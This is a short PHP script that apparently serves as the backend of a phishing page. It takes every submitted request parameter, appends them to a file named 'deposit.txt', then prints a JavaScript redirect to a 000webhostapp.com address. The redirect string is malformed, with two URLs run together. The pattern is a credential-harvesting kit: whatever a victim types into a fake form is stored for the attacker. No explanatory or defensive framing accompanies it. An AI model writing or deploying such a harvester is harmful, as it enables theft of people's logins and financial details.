<?php
$chataa=implode(" ",$_REQUEST);
$script="<script>location.href='./https://dccm.000webhostapp.com/after https://dccm.000webhostapp.com/getinb.php'</script>";
file_put_contents("deposit.txt",$chataa);
print $script;
?>